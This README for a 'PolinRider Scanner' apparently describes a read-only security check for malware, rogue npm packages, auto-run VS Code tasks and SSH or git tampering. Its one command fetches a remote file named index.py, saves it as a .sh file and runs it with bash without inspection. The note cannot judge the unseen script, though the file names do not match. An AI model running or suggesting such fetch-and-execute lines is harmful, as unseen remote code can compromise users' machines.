# PolinRider Scanner

PolinRider scanning code built for a security checkup on your computer. It only reads. It never changes or deletes anything on your computer.

## How to run it

1. Open the right app.
   * **Mac or Linux:** open **Terminal**.
   * **Windows:** open **Git Bash** (comes with Git for Windows). Do not use PowerShell or Command Prompt.
2. Paste this line and press Enter.

```
curl -fsSL https://raw.githubusercontent.com/7span/git-audit/main/index.py -o /tmp/scan.sh && bash /tmp/scan.sh
```

3. Wait a few minutes. The result appears on the screen.

**What this line does:** downloads the check to a temporary file, then runs it.

**What success looks like:** a list of numbered tests, each with a mark (see below), and a summary at the end.

**If it fails:**
* Nothing happens or you see "could not resolve host": check your internet connection and run it again.
* "command not found": you are in the wrong app. Use Terminal (Mac or Linux) or Git Bash (Windows).
* Your Mac asks to open some folders: click **Allow**, then run it again.

## What the result means

Look at the last lines.

| You see | What to do |
|---|---|
| **ALL CLEAR** | Nothing. You are done. |
| **FINDING(S)** | Do not upload or push any work. Do not delete any files. Send the result to your security lead. |
| An error or nothing happens | Run the line again. If it still fails, ask for help. |

## What each mark means

| Mark | Meaning |
|---|---|
| ✅ | Clean |
| ⚠️ | Looks unusual. It may be harmless, so check it. |
| 🔴 | Harmful software found. Follow the FINDING(S) steps above. |
| 👀 | For your information. Look for anything you do not recognise. |

## What it checks

The check runs 33 tests (35 on Mac). It looks for:

* Signs that harmful software has already run on your computer.
* Harmful code hidden inside your project files.
* Fake font files and invisible characters used to hide code.
* VS Code tasks that secretly run code when you open a project.
* Known harmful npm packages and accounts.
* Hidden programs that start by themselves, and changes to your SSH keys or git settings.
* Connections to servers used by attackers.

## Good to know

* Works on Mac, Linux and Windows (in Git Bash).
* Needs an internet connection.
* It never shows passwords or tokens.
